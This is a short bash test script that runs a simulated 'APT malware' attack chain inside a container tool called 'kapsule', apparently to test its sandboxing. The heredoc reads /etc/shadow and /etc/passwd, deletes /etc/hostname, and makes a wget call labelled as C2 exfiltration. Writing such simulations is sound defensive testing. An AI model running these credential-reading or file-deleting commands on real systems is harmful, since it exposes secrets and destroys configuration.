#!/bin/bash
echo -e "\e[1;31m=== RUNNING SCENARIO 5: FULL APT MALWARE SIMULATION ===\e[0m"
make clean && make
sudo ./kapsule << 'EOF'
echo "💀 [MALWARE] Payload executed inside container..."

# 1. Sandbox Evasion (Time-Bomb)
echo "⏳ [MALWARE] Sleeping to bypass dynamic analysis engines..."
sleep 6

# 2. Reconnaissance & Credential Theft
echo "👁️  [MALWARE] Harvesting system credentials..."
cat /etc/shadow > /dev/null
cat /etc/passwd > /dev/null

# 3. Ransomware Simulation (File Write)
echo "🔒 [MALWARE] 'Encrypting' sensitive data..."
echo "U2FsdGVkX1+XYZ... (Simulated Encrypted Data)" > /tmp/database.enc

# 4. Covering Tracks (Data Destruction)
echo "🔥 [MALWARE] Deleting system configuration..."
rm /etc/hostname 2>/dev/null

# 5. Execution / Persistence
echo "🧟 [MALWARE] Spawning secondary malicious process..."
sh -c "echo 'Secondary payload running...'"

# 6. Command & Control (C2) Exfiltration Attempt
echo "📡 [MALWARE] Attempting to exfiltrate data to C2 server..."
wget -T 2 http://1.1.1.1 > /dev/null 2>&1

echo "✅ [MALWARE] Attack chain complete. Terminating."
exit
EOF
